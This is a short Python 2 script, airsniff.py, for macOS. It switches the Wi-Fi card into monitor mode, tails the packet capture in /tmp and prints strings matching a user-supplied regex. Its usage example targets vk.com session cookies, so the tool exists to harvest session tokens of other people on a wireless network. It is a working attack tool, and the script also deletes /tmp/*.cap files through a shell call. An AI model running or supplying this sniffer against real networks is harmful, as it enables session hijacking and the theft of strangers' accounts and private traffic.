#!/usr/bin/env python 

#coding:utf-8
import sys
import os
import glob
import signal
import re
import subprocess
import time


if len(sys.argv) == 1:
	print('''
------------------
Usage: airsniff.py <channel> <\\"pattern\\">
<channell> - wifi channel
<"pattern"> - regexp that will grep /tmp/*.cap file. Quotes required!
Example for vk.com: ./airsniff.py 10 "remixsid=[a-f0-9]{53}"
''')
	sys.exit();

channel = sys.argv[1]
pattern = sys.argv[2]
showed = []


# kill loop and airport process when press Ctrl+C
def signal_handler(signal, frame):
	print ' Aborted.'
	subprocess.Popen(['kill', str(AirportObj.pid)])
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)


##########
##########
##########

# Remove all *.cap from /tmp/
print "rm /tmp/*.cap"
rm = subprocess.call("rm /tmp/*.cap", shell=True)

# Switch airport into monitor and put process in backgroung
# If you exit non clear airport process still be run in background
print "Switching airport into monitor mode on channel " + channel  
AirportObj = subprocess.Popen(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport','sniff',channel], stdout=subprocess.PIPE)

time.sleep(2)

if (AirportObj.poll() != None):
	print AirportObj.poll()	
	print "\nError!\nTry run /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport scan" 
	sys.exit()

file_path = glob.glob('/tmp/*.cap')[0]
print "Dump file path " + file_path

file = open(file_path,'r')

st_results = os.stat(file_path)
st_size = st_results[6]
file.seek(st_size)

print 'Now running in loop:  grep -aEo "' + pattern + '" ' + file_path
print "Press Ctrl+C to abort."
while True:
	where = file.tell()
	line = file.readline()
	if not line:
		time.sleep(10)
		file.seek(where)
	else:
# 		print "File size: " + str(os.path.getsize(file_path)/1000) + " KB"
		match = re.findall(pattern, line )
		if(match != None):
			for string in match:
				if string in showed:
					pass
				else:
					print string
					showed.append(string)
